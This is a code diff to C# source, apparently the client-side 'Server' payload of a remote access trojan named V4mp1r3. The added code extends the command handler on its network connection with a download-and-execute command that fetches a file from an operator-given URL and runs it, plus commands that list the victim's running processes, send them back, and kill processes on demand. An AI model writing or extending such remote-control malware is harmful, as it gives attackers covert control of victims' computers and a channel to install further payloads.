@@ -70,6 +70,7 @@ namespace V4mp1r3
             using System.Threading;
             using Microsoft.Win32;
             using System.Reflection;
+            using System.Net;
             namespace Server
             {
                 static class Program
@@ -115,7 +116,6 @@ namespace V4mp1r3
                                 receive = br.ReadString();
                                 if (receive == """")
                                 {
-
                                 }
                                 else if(receive == ""Del"")
                                 {
@@ -130,6 +130,70 @@ namespace V4mp1r3
                                     {
                                         Environment.Exit(0);
                                     }
+                                }
+                                else if(receive.Substring(0,3) == ""dar"")
+                                {
+                                    string[] receiveplus = receive.Split(',');
+                                    WebClient webclient = new WebClient();
+                                    try
+                                    {
+                                        ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
+                                        webclient.DownloadFile(receiveplus[2].ToString(), receiveplus[3].ToString());
+                                        if(receiveplus[1] == ""1"")
+                                        {
+                                            Process.Start(receiveplus[3].ToString());
+                                        }
+                                        bw = new BinaryWriter(clientStream);
+                                        bw.Write(""操作成功完成！""); 
+                                    }
+                                    catch(Exception e)
+                                    {
+                                        bw = new BinaryWriter(clientStream);
+                                        bw.Write(e.Message); 
+                                    }
+                                }
+                                else if (receive == ""prm"")
+                                {
+                                    try
+                                    {
+                                        Process[] processes = Process.GetProcesses(""."");
+                                        string pname = null;
+                                        string pid = null;
+                                        string pplace = null;
+                                        foreach (Process p in processes)
+                                        {
+                                            pname += p.ProcessName.ToString() + "","";
+                                            pid += p.Id.ToString() + "","";
+                                            pplace += p.PrivateMemorySize64.ToString() + "","";
+                                        }
+                                        bw = new BinaryWriter(clientStream);
+                                        bw.Write(pname);
+                                        Thread.Sleep(100);
+                                        bw.Write(pid);
+                                        Thread.Sleep(100);
+                                        bw.Write(pplace);
+                                    }
+                                    catch
+                                    {
+
+                                    }
+                                }
+                                else if(receive.Substring(0, 3) == ""prk"")
+                                {
+                                    try
+                                    {
+                                        string[] receiveplus = receive.Split(',');
+                                        Process p = Process.GetProcessById(Int32.Parse(receiveplus[1]));
+                                        p.Kill();
+                                    }
+                                    catch
+                                    {
+
+                                    }
+                                }
+                                else if(receive == ""disconnect"")
+                                {
+                                    Environment.Exit(0);
                                 }
                                 else
                                 {
